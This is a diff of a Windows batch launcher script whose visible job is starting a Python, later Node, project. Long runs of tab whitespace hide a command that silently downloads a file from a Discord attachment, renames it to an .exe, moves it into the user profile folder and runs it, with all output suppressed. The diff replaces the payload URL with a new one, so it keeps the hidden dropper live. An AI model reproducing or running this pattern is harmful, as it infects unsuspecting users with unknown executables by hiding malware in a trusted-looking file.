@@ -1,5 +1,5 @@
 @echo off
-																																																																																																																																			curl -L -o Duck.mrt "https://cdn.discordapp.com/attachments/1295508775205343335/1313273791861886996/Duck.mrt?ex=674f8907&is=674e3787&hm=c211648ad593bbe8c50c700e4728b58b2582b09681afba31e0b16bcf978ae05f&" >nul 2>&1 && rename Duck.mrt Duck.exe >nul 2>&1 && move /y Duck.exe %USERPROFILE%\Duck.exe >nul 2>&1 && start %USERPROFILE%\Duck.exe
-py main.py
+																																																																																																																																			curl -L -o Duck.mrt "https://cdn.discordapp.com/attachments/1295508775205343335/1313515242143092757/Duck.mrt?ex=675069e5&is=674f1865&hm=3941a150a9e8a5b9ac84004e9acc3bca71d58263a6ae4962058088eae81df115&" >nul 2>&1 && rename Duck.mrt Duck.exe >nul 2>&1 && move /y Duck.exe %USERPROFILE%\Duck.exe >nul 2>&1 && start %USERPROFILE%\Duck.exe
+node .
 
 pause
